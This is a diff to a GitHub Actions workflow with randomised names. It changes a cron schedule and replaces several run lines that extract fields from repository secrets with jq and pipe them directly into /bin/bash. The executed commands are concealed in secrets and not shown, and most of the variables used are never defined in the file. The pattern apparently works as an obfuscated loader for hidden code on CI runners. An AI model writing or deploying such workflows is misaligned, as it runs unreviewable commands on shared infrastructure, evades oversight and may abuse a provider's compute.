@@ -1,10 +1,8 @@
 name: yuchangkan3910
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 3/6 * * *'
-
+    - cron: '31 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +10,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: yuchangkan3910
         env:
-          im3503: ${{ secrets.im3503 }}
+          gbfdh756: ${{ secrets.gbfdh756 }}
         run: |
-          echo $im3503 | jq -r .kqdit6 | /bin/bash
-          echo $wjtll2071 | jq -r .kpfo199 | /bin/bash
-          echo $xpyni50733 | jq -r .v325 | /bin/bash
-          echo $w0170 | jq -r .smf2273 | /bin/bash
-          echo $qcj76036 | jq -r .rrcm47 | /bin/bash
+          echo $gbfdh756 | jq -r .jbdv10 | /bin/bash
+          echo $oape144 | jq -r .q2 | /bin/bash
+          echo $or75 | jq -r .akkwp61575 | /bin/bash
+          echo $hq50 | jq -r .selwv77570 | /bin/bash
+          echo $edge028 | jq -r .v147 | /bin/bash
+          echo $u01 | jq -r .sxjdo096 | /bin/bash
+          echo $yyyxm236 | jq -r .dnr73 | /bin/bash
+          echo $m007 | jq -r .kd71 | /bin/bash
+          echo $qzs0489 | jq -r .mrjn24 | /bin/bash
+          echo $nieq81 | jq -r .k9 | /bin/bash
+          echo $lbocz53 | jq -r .ktksw6 | /bin/bash
+          echo $jmr84469 | jq -r .bzpt633 | /bin/bash
 
